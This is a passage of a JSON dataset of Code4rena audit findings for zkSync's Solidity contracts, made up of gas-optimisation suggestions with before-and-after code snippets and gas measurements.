      "tags": [],
      "finders": []
    },
    {
      "id": "30361",
      "title": "[G-18] Precalculate constants in `Config.sol`.",
      "impact": "GAS",
      "content": "\nWhile constants have known value, to save more gas, calculate their values before compile-time.\n\n[File: ethereum/contracts/zksync/Config.sol](https://github.com/code-423n4/2023-10-zksync/blob/main/code/contracts/ethereum/contracts/zksync/Config.sol)\n\n```\nuint256 constant MAX_L2_TO_L1_LOGS_COMMITMENT_BYTES = 4 + L2_TO_L1_LOG_SERIALIZE_SIZE * 512\nuint256 constant MAX_INITIAL_STORAGE_CHANGES_COMMITMENT_BYTES = 4 + INITIAL_STORAGE_CHANGE_SERIALIZE_SIZE * 4765;\nuint256 constant MAX_REPEATED_STORAGE_CHANGES_COMMITMENT_BYTES = 4 + REPEATED_STORAGE_CHANGE_SERIALIZE_SIZE * 7564;\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30360",
      "title": "[G-17] Division by powers of two should use bit shifting in `Merkle.sol`",
      "impact": "GAS",
      "content": "\nWhile the bot report reported every division by powers of two in a form: `A / 2`, it misses an instance, which looks like: `A /= 2`.\n\n[File: ethereum/contracts/zksync/libraries/Merkle.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/libraries/Merkle.sol#L33)\n\n```\n_index /= 2;\n```\n\nIt should be changed to: `_index = _index >> 1;`.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30359",
      "title": "[G-16] Unnecessary variables in `LibMap.sol`",
      "impact": "GAS",
      "content": "\n**Function `get`:**\n\nVariables `mapValue` and `bitOffset` are used only once, which means they don't need to be declared at all. The code snippet below can be changed from:\n\n[File: ethereum/contracts/zksync/libraries/LibMap.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/libraries/LibMap.sol#L21-L28)\n\n```\nuint256 mapValue = _map.map[_index / 8];\n\n// First three bits of the original `_index` denotes the position of the uint32 in that slot.\n// So, '(_index & 7) * 32' is done to find the bit position of the uint32 in that storage slot.\nuint256 bitOffset = (_index & 7) * 32;\n\n// Shift the bits to the right and retrieve the uint32 value.\nresult = uint32(mapValue >> bitOffset);\n```\n\nTo:\n\n```\nresult = uint32(_map.map[_index / 8] >> ( (_index & 7) * 32));\n```\n\n**Function `set`:**\n\nVariables `oldValue` and `nexValueXorOldValue` are used only once, which means they don't need to be declared at all. The code snippet below can be changed from:\n\n[File: ethereum/contracts/zksync/libraries/LibMap.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/libraries/LibMap.sol#L56-L63)\n\n```\n            uint32 oldValue = uint32(mapValue >> bitOffset);\n\n            // Calculate the XOR of the new value and the existing value.\n            uint256 newValueXorOldValue = uint256(oldValue ^ _value);\n\n            // Finally, we XOR the slot with the XOR of the new value and the existing value,\n            // shifted to its proper position. The XOR operation will effectively replace the old value with the new value.\n            _map.map[mapIndex] = (newValueXorOldValue << bitOffset) ^ mapValue;\n```\n\nTo:\n\n```\n            _map.map[mapIndex] = (uint256(uint32(mapValue >> bitOffset) ^ _value) << bitOffset) ^ mapValue;\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30358",
      "title": "[G-15] One + operation is redundant in `_verifyDepositLimit` in `L1ERC20Bridge.sol`",
      "impact": "GAS",
      "content": "\n[File: ethereum/contracts/bridge/L1ERC20Bridge.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/bridge/L1ERC20Bridge.sol#L346-L349)\n\n```\n } else {\n            require(totalDepositedAmountPerUser[_l1Token][_depositor] + _amount <= limitData.depositCap, \"d1\");\n            totalDepositedAmountPerUser[_l1Token][_depositor] += _amount;\n        }\n```\n\nWe don't need to add `amount` twice. Firstly, to check `require` statement, and secondly, to increase `totalDepositedAmountPerUser[_l1Token][_depositor]`. We can change the order of `require` to do so:\n\n```\n } else {\n            \n            totalDepositedAmountPerUser[_l1Token][_depositor] += _amount;\n            require(totalDepositedAmountPerUser[_l1Token][_depositor]  <= limitData.depositCap, \"d1\");\n        }\n```\n\nIf `totalDepositedAmountPerUser[_l1Token][_depositor] + _amount` exceeds `limitData.depositCap`, we will still revert.\n\nTo prove, that this will indeed save some gas, a minimalized code snippet in Remix IDE has been prepared:\n\n```\nmapping(address => mapping(address => uint256)) public totalDepositedAmountPerUser;\nfunction current(uint _amount) public {\n    uint g = gasleft();\n    require(totalDepositedAmountPerUser[msg.sender][msg.sender] + _amount <= 1000, \"d1\");\n    totalDepositedAmountPerUser[msg.sender][msg.sender] += _amount;\n    console.log(g - gasleft());\n}\n\nfunction afterFix(uint _amount) public {\n    uint g = gasleft();\n    totalDepositedAmountPerUser[msg.sender][msg.sender] += _amount;\n    require(totalDepositedAmountPerUser[msg.sender][msg.sender]  <= 1000, \"d1\");\n    console.log(g - gasleft());\n}\n```\n\nFunction `current()` uses 5895 gas, while function `afterFix()` uses 5707, which implies, that proposed fix is better optimized for a gas usage.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30357",
      "title": "[G-14] Do not assign `offset` in the last call of `UnsafeBytes.readUint256` in `L1ERC20Bridge.sol`",
      "impact": "GAS",
      "content": "\nA simple test in Remix IDE has been created, to compare gas usage of assigning more than one value from function call:\n\n```\n  function getUints() public pure returns (uint, uint) {return (1, 2);}\n   function getAll() public view {\n    uint a; uint b; \n    (a, b) = getUints();\n    uint g = gasleft();\n    (a, b) = getUints();\n    console.log(g - gasleft());\n   }\n    function getOne() public view {\n    uint a; uint b; \n    (a, b) = getUints();\n    uint g = gasleft();\n    (a, ) = getUints();\n    console.log(g - gasleft());\n   }\n```\n\n`getOne()` costs 74 gas, while `getAll()` costs 82 gas. This implies, that we shouldn't assign every parameter from function call if it's not needed.\n\nIn the last call of `UnsafeBytes.readUint256(_l2ToL1message, offset)` (line 336):\n\n[File: ethereum/contracts/bridge/L1ERC20Bridge.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/bridge/L1ERC20Bridge.sol#L336)\n\n```\n(amount, offset) = UnsafeBytes.readUint256(_l2ToL1message, offset);\n```\n\nWe won't need `offset` anymore, thus we can change line 336 to: `(amount, ) = UnsafeBytes.readUint256(_l2ToL1message, offset);`.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30356",
      "title": "[G-13] Check if `amount` is greater than zero before performing `safeTransfer` in `L1ERC20Bridge.sol`",
      "impact": "GAS",
      "content": "\n[File: ethereum/contracts/bridge/L1ERC20Bridge.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/bridge/L1ERC20Bridge.sol#L317)\n\n```\n        IERC20(l1Token).safeTransfer(l1Receiver, amount);\n```\n\n`safeTransfer`'ing  when `amount = 0` is a waste of gas, since there will be no funds transferred. To save gas, check if `amount` is greater than `0`, before calling `safeTransfer`.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30355",
      "title": "[G-12] Calculation which won't underflow can be unchecked in `L1ERC20Bridge.sol`",
      "impact": "GAS",
      "content": "\n[File: ethereum/contracts/bridge/L1ERC20Bridge.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/bridge/L1ERC20Bridge.sol#L221)\n\n```\nreturn balanceAfter - balanceBefore;\n```\n\nSince `balanceAfter` contains token's balance after the transfer, and `balanceBefore` contains token's balance before the transfer, we know, that `balanceAfter >= balanceBefore`, thus `balanceAfter - balanceBefore` will never underflow and can be unchecked.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30354",
      "title": "[G-11] Unnecessary variables in `L1ERC20Bridge.sol`",
      "impact": "GAS",
      "content": "\n**Function `initialize`:**\n\nVariables `l2WethBridgeImplementationBytecodeHash` and `l2WethBridgeProxyBytecodeHash` are used only once, which means they don't need to be declared at all. The code snippet below can be changed from:\n\n[File: ethereum/contracts/bridge/L1ERC20Bridge.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/bridge/L1ERC20Bridge.sol#L99-L130)\n\n```\n        bytes32 l2BridgeImplementationBytecodeHash = L2ContractHelper.hashL2Bytecode(_factoryDeps[0]);\n        bytes32 l2BridgeProxyBytecodeHash = L2ContractHelper.hashL2Bytecode(_factoryDeps[1]);\n\n        // Deploy L2 bridge implementation contract\n        address bridgeImplementationAddr = BridgeInitializationHelper.requestDeployTransaction(\n            zkSync,\n            _deployBridgeImplementationFee,\n            l2BridgeImplementationBytecodeHash,\n            \"\", // Empty constructor data\n            _factoryDeps // All factory deps are needed for L2 bridge\n        );\n\n(...)\n\n        // Deploy L2 bridge proxy contract\n        l2Bridge = BridgeInitializationHelper.requestDeployTransaction(\n            zkSync,\n            _deployBridgeProxyFee,\n            l2BridgeProxyBytecodeHash,\n            l2BridgeProxyConstructorData,\n            // No factory deps are needed for L2 bridge proxy, because it is already passed in previous step\n            new bytes[](0)\n        );\n```\n\nTo:\n\n```\n        // Deploy L2 bridge implementation contract\n        address bridgeImplementationAddr = BridgeInitializationHelper.requestDeployTransaction(\n            zkSync,\n            _deployBridgeImplementationFee,\n            L2ContractHelper.hashL2Bytecode(_factoryDeps[0]),\n            \"\", // Empty constructor data\n            _factoryDeps // All factory deps are needed for L2 bridge\n        );\n\n(...)\n\n        // Deploy L2 bridge proxy contract\n        l2Bridge = BridgeInitializationHelper.requestDeployTransaction(\n            zkSync,\n            _deployBridgeProxyFee,\n            L2ContractHelper.hashL2Bytecode(_factoryDeps[1]),\n            l2BridgeProxyConstructorData,\n            // No factory deps are needed for L2 bridge proxy, because it is already passed in previous step\n            new bytes[](0)\n        );\n```\n\n**Function `_depositFunds`:**\n\nVariable `balanceAfter` is used only once, which means it doesn't need to be declared at all. The code snippet below can be changed from:\n\n[File: ethereum/contracts/bridge/L1ERC20Bridge.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/bridge/L1ERC20Bridge.sol#L219-L221)\n\n```\n        uint256 balanceAfter = _token.balanceOf(address(this));\n\n        return balanceAfter - balanceBefore;\n```\n\nTo:\n\n```\nreturn _token.balanceOf(address(this)) - balanceBefore;\n```\n\n**Function `claimFailedDeposit`:**\n\nVariable `proofValid` is used only once, which means it doesn't need to be declared at all. The code snippet below can be changed from:\n\n[File: ethereum/contracts/bridge/L1ERC20Bridge.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/bridge/L1ERC20Bridge.sol#L264-L272)\n\n```\n bool proofValid = zkSync.proveL1ToL2TransactionStatus(\n            _l2TxHash,\n            _l2BatchNumber,\n            _l2MessageIndex,\n            _l2TxNumberInBatch,\n            _merkleProof,\n            TxStatus.Failure\n        );\n        require(proofValid, \"yn\");\n```\n\nTo:\n\n```\n        require(zkSync.proveL1ToL2TransactionStatus(\n            _l2TxHash,\n            _l2BatchNumber,\n            _l2MessageIndex,\n            _l2TxNumberInBatch,\n            _merkleProof,\n            TxStatus.Failure\n        ), \"yn\");\n```\n\n**Function `finalizeWithdrawal`:**\n\nVariable `success` is used only once, which means it doesn't need to be declared at all. The code snippet below can be changed from:\n\n[File: ethereum/contracts/bridge/L1ERC20Bridge.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/bridge/L1ERC20Bridge.sol#L311-L312)\n\n```\n            bool success = zkSync.proveL2MessageInclusion(_l2BatchNumber, _l2MessageIndex, l2ToL1Message, _merkleProof);\n            require(success, \"nq\");\n```\n\nTo:\n\n```\n            require(zkSync.proveL2MessageInclusion(_l2BatchNumber, _l2MessageIndex, l2ToL1Message, _merkleProof), \"nq\");\n```\n\n**Function `l2TokenAddress`:**\n\nVariables `constructorInputHash` and `salt` are used only once, which means they don't need to be declared at all. The code snippet below can be changed from:\n\n[File: ethereum/contracts/bridge/L1ERC20Bridge.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/bridge/L1ERC20Bridge.sol#L354-L357)\n\n```\n        bytes32 constructorInputHash = keccak256(abi.encode(address(l2TokenBeacon), \"\"));\n        bytes32 salt = bytes32(uint256(uint160(_l1Token)));\n\n        return L2ContractHelper.computeCreate2Address(l2Bridge, salt, l2TokenProxyBytecodeHash, constructorInputHash);\n```\n\nTo:\n\n```\n        return L2ContractHelper.computeCreate2Address(l2Bridge, bytes32(uint256(uint160(_l1Token))), l2TokenProxyBytecodeHash, keccak256(abi.encode(address(l2TokenBeacon), \"\")));\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30353",
      "title": "[G-10] Do not assign `offset` in the last call of `UnsafeBytes.readAddress` in `L1WethBridge.sol`",
      "impact": "GAS",
      "content": "\nA simple test in Remix IDE has been created, to compare gas usage of assigning more than one value from function call:\n\n```\n  function getUints() public pure returns (uint, uint) {return (1, 2);}\n   function getAll() public view {\n    uint a; uint b; \n    (a, b) = getUints();\n    uint g = gasleft();\n    (a, b) = getUints();\n    console.log(g - gasleft());\n   }\n    function getOne() public view {\n    uint a; uint b; \n    (a, b) = getUints();\n    uint g = gasleft();\n    (a, ) = getUints();\n    console.log(g - gasleft());\n   }\n```\n\n`getOne()` costs 74 gas, while `getAll()` costs 82 gas. This implies, that we shouldn't assign every parameter from function call if it's not needed. In the last call of `UnsafeBytes.readAddress(_message, offset)` (line 298):\n\n[File: ethereum/contracts/bridge/L1WethBridge.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/bridge/L1WethBridge.sol#L298)\n\n```\n(l1WethReceiver, offset) = UnsafeBytes.readAddress(_message, offset);\n```\n\nWe won't need `offset` anymore, thus we can change line 298 to: `(l1WethReceiver, ) = UnsafeBytes.readAddress(_message, offset)`.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30352",
      "title": "[G-09] Check if `amount` is greater than zero before performing `safeTransfer` in `L1WethBridge.sol`",
      "impact": "GAS",
      "content": "\n[File: ethereum/contracts/bridge/L1WethBridge.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/bridge/L1WethBridge.sol#L263)\n\n```\n        IERC20(l1WethAddress).safeTransfer(l1WethWithdrawReceiver, amount);\n```\n\n`safeTransfer`'ing  when `amount = 0` is a waste of gas, since there will be no funds transferred.\nTo save gas, check if `amount` is greater than `0`, before calling `safeTransfer`.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30351",
      "title": "[G-08] Unnecessary variables in `L1WethBridge.sol`",
      "impact": "GAS",
      "content": "\n**Function `initialize`:**\n\nVariables `l2WethBridgeImplementationBytecodeHash` and `l2WethBridgeProxyBytecodeHash` are used only once, which means they don't need to be declared at all. The code snippet below can be changed from:\n\n[File: ethereum/contracts/bridge/L1WethBridge.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/bridge/L1WethBridge.sol#L98-L133)\n\n```\n        bytes32 l2WethBridgeImplementationBytecodeHash = L2ContractHelper.hashL2Bytecode(_factoryDeps[0]);\n        bytes32 l2WethBridgeProxyBytecodeHash = L2ContractHelper.hashL2Bytecode(_factoryDeps[1]);\n\n        // Deploy L2 bridge implementation contract\n        address wethBridgeImplementationAddr = BridgeInitializationHelper.requestDeployTransaction(\n            zkSync,\n            _deployBridgeImplementationFee,\n            l2WethBridgeImplementationBytecodeHash,\n            \"\", // Empty constructor data\n            _factoryDeps // All factory deps are needed for L2 bridge\n        );\n\n(...)\n\n        // Deploy L2 bridge proxy contract\n        l2Bridge = BridgeInitializationHelper.requestDeployTransaction(\n            zkSync,\n            _deployBridgeProxyFee,\n            l2WethBridgeProxyBytecodeHash,\n            l2WethBridgeProxyConstructorData,\n            // No factory deps are needed for L2 bridge proxy, because it is already passed in the previous step\n            new bytes[](0)\n        );\n```\n\nTo:\n\n```\n \n        // Deploy L2 bridge implementation contract\n        address wethBridgeImplementationAddr = BridgeInitializationHelper.requestDeployTransaction(\n            zkSync,\n            _deployBridgeImplementationFee,\n            L2ContractHelper.hashL2Bytecode(_factoryDeps[0]);,\n            \"\", // Empty constructor data\n            _factoryDeps // All factory deps are needed for L2 bridge\n        );\n\n(...)\n        // Deploy L2 bridge proxy contract\n        l2Bridge = BridgeInitializationHelper.requestDeployTransaction(\n            zkSync,\n            _deployBridgeProxyFee,\n            L2ContractHelper.hashL2Bytecode(_factoryDeps[1]),\n            l2WethBridgeProxyConstructorData,\n            // No factory deps are needed for L2 bridge proxy, because it is already passed in the previous step\n            new bytes[](0)\n        );\n```\n\n**Function `finalizeWithdrawal`:**\n\nVariables `alreadyFinalised`, `l2ToL1Message` and `success` are used only once, which means they don't need to be declared at all. The code snippet below can be changed from:\n\n[File: ethereum/contracts/bridge/L1WethBridge.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/bridge/L1WethBridge.sol#L245-L254)\n\n```\nbool alreadyFinalised = zkSync.isEthWithdrawalFinalized(_l2BatchNumber, _l2MessageIndex);\n        if (alreadyFinalised) {\n            // Check that the specified message was actually sent while withdrawing eth from L2.\n            L2Message memory l2ToL1Message = L2Message({\n                txNumberInBatch: _l2TxNumberInBatch,\n                sender: L2_ETH_TOKEN_SYSTEM_CONTRACT_ADDR,\n                data: _message\n            });\n            bool success = zkSync.proveL2MessageInclusion(_l2BatchNumber, _l2MessageIndex, l2ToL1Message, _merkleProof);\n            require(success, \"vq\");\n```\n\nTo:\n\n```\n        if (zkSync.isEthWithdrawalFinalized(_l2BatchNumber, _l2MessageIndex)) {\n            require(zkSync.proveL2MessageInclusion(_l2BatchNumber, _l2MessageIndex, L2Message({\n                txNumberInBatch: _l2TxNumberInBatch,\n                sender: L2_ETH_TOKEN_SYSTEM_CONTRACT_ADDR,\n                data: _message\n            }), _merkleProof), \"vq\");\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30350",
      "title": "[G-07] Unnecessary variable in `BridgeInitializationHelper.sol`",
      "impact": "GAS",
      "content": "\n**Function `requestDeployTransaction`:**\nVariable `deployCalldata` is used only once, which means it doesn't need to be declared at all. The code snippet below can be changed from:\n\n[File: ethereum/contracts/common/AllowList.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/bridge/libraries/BridgeInitializationHelper.sol#L37-L49)\n\n```\n        bytes memory deployCalldata = abi.encodeCall(\n            IL2ContractDeployer.create2,\n            (bytes32(0), _bytecodeHash, _constructorData)\n        );\n        _zkSync.requestL2Transaction{value: _deployTransactionFee}(\n            L2_DEPLOYER_SYSTEM_CONTRACT_ADDR,\n            0,\n            deployCalldata,\n            DEPLOY_L2_BRIDGE_COUNTERPART_GAS_LIMIT,\n            REQUIRED_L2_GAS_PRICE_PER_PUBDATA,\n            _factoryDeps,\n            msg.sender\n        );\n```\n\nTo:\n\n```\n        _zkSync.requestL2Transaction{value: _deployTransactionFee}(\n            L2_DEPLOYER_SYSTEM_CONTRACT_ADDR,\n            0,\n            abi.encodeCall(\n            IL2ContractDeployer.create2,\n            (bytes32(0), _bytecodeHash, _constructorData)\n        ),\n            DEPLOY_L2_BRIDGE_COUNTERPART_GAS_LIMIT,\n            REQUIRED_L2_GAS_PRICE_PER_PUBDATA,\n            _factoryDeps,\n            msg.sender\n        );\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30349",
      "title": "[G-06] Length of `_factoryDeps` is calculated multiple of times in `_verifyFactoryDeps` in `BaseZkSyncUpgrade.sol`.",
      "impact": "GAS",
      "content": "\nCalculating length of array cost gas. Instead of doing it every time, calculate it once and assign that value to local variable.\n\n`_factoryDeps.length` is being calculated:\n- ` require(_factoryDeps.length == _expectedHashes.length, \"Wrong number of factory deps\");`  in the 1st `require`.\n- `require(_factoryDeps.length <= MAX_NEW_FACTORY_DEPS, \"Factory deps can be at most 32\");` in the 2nd `require`.\n- `for (uint256 i = 0; i < _factoryDeps.length; ++i) {` in loop (this one was reported in the bot-race).\n\n[File: ethereum/contracts/upgrades/BaseZkSyncUpgrade.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/upgrades/BaseZkSyncUpgrade.sol#L201-L204)\n\n```\n        require(_factoryDeps.length == _expectedHashes.length, \"Wrong number of factory deps\");\n        require(_factoryDeps.length <= MAX_NEW_FACTORY_DEPS, \"Factory deps can be at most 32\");\n\n        for (uint256 i = 0; i < _factoryDeps.length; ++i) {\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30348",
      "title": "[G-05] Unnecessary variable in `AllowList.sol`",
      "impact": "GAS",
      "content": "\n**Function `_setPermissionToCall`:**\n\nVariable `currentPermission` is used only once, which means it doesn't need to be declared at all. The code snippet below can be changed from:\n\n[File: ethereum/contracts/common/AllowList.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/common/AllowList.sol#L117-L119)\n\n```\n bool currentPermission = hasSpecialAccessToCall[_caller][_target][_functionSig];\n\n        if (currentPermission != _enable) {\n```\n\nTo:\n\n```\n        if (hasSpecialAccessToCall[_caller][_target][_functionSig] != _enable) {\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30347",
      "title": "[G-04] Unnecessary variables in `L2ContractHelper.sol`",
      "impact": "GAS",
      "content": "\n**Function `validateBytecodeHash`:**\n\nVariable `version` is used only once, which means, it doesn't need to be declared at all. The code snippet below can be changed from:\n\n[File: ethereum/contracts/common/libraries/L2ContractHelper.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/common/libraries/L2ContractHelper.sol#L40-L41)\n```\n        uint8 version = uint8(_bytecodeHash[0]);\n        require(version == 1 && _bytecodeHash[1] == bytes1(0), \"zf\"); // Incorrectly formatted bytecodeHash\n```\n\nTo:\n\n```\nrequire(uint8(_bytecodeHash[0]) == 1 && _bytecodeHash[1] == bytes1(0), \"zf\"); // Incorrectly formatted bytecodeHash\n```\n\n**Function `computeCreate2Address`:**\n\nVariables `senderBytes`, `data` are used only once, which means, they don't need to be declared at all. The code snippet below can be changed from:\n\n[File: ethereum/contracts/common/libraries/L2ContractHelper.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/common/libraries/L2ContractHelper.sol#L66-L71)\n\n```\n        bytes32 senderBytes = bytes32(uint256(uint160(_sender)));\n        bytes32 data = keccak256(\n            bytes.concat(CREATE2_PREFIX, senderBytes, _salt, _bytecodeHash, _constructorInputHash)\n        );\n\n        return address(uint160(uint256(data)));\n```\n\nTo:\n\n```\n        return address(uint160(uint256(keccak256(bytes.concat(CREATE2_PREFIX, bytes32(uint256(uint160(_sender))), _salt, _bytecodeHash, _constructorInputHash)))));\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30346",
      "title": "[G-03] `require` in `hashL2Bytecode` in `L2ContractHelper.sol` can be moved on top",
      "impact": "GAS",
      "content": "\n[File: ethereum/contracts/common/libraries/L2ContractHelper.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/common/libraries/L2ContractHelper.sol#L23-L26)\n\n```\n        require(_bytecode.length % 32 == 0, \"pq\");\n\n        uint256 bytecodeLenInWords = _bytecode.length / 32;\n        require(bytecodeLenInWords < 2**16, \"pp\"); // bytecode length must be less than 2^16 words\n```\n\nSince `_bytecode.length` is divisible by 32 (the first `require`), we know, that we can divide `_bytecode.length` by 32, without a remainder.\n\nLet's take a look at the 2nd `require`:\n\n`bytecodeLenInWords < 2**16  =>  _bytecode.length / 32 < 2**16  => _bytecode.length < 2**16 * 32  => _bytecode.length < 2**21`\n\nThis implies that we can rewrite above code snippet as:\n\n```\n        require(_bytecode.length % 32 == 0, \"pq\");\n        require(_bytecode.length < 2**21, \"pp\"); // bytecode length must be less than 2^16 words\n        uint256 bytecodeLenInWords = _bytecode.length / 32;\n        \n```\n\nThat way, when `_bytecode.length` is too big, we will revert immediately, instead of wasting gas on executing line: `uint256 bytecodeLenInWords = _bytecode.length / 32`. That line will be executed after the 2nd `require`.\n\nMoreover, please keep in mind, to cache `_bytecode.length` into local variable - as it was suggested in `G-02`:\n\n```\n        uint256 _bytecodeLength = _bytecode.length;\n        require(_bytecodeLength % 32 == 0, \"pq\");\n        require(_bytecodeLength < 2**21, \"pp\"); // bytecode length must be less than 2^16 words\n        uint256 bytecodeLenInWords = _bytecodeLength / 32;\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30345",
      "title": "[G-02] Length of `_bytecode` is calculated twice in `L2ContractHelper.sol`",
      "impact": "GAS",
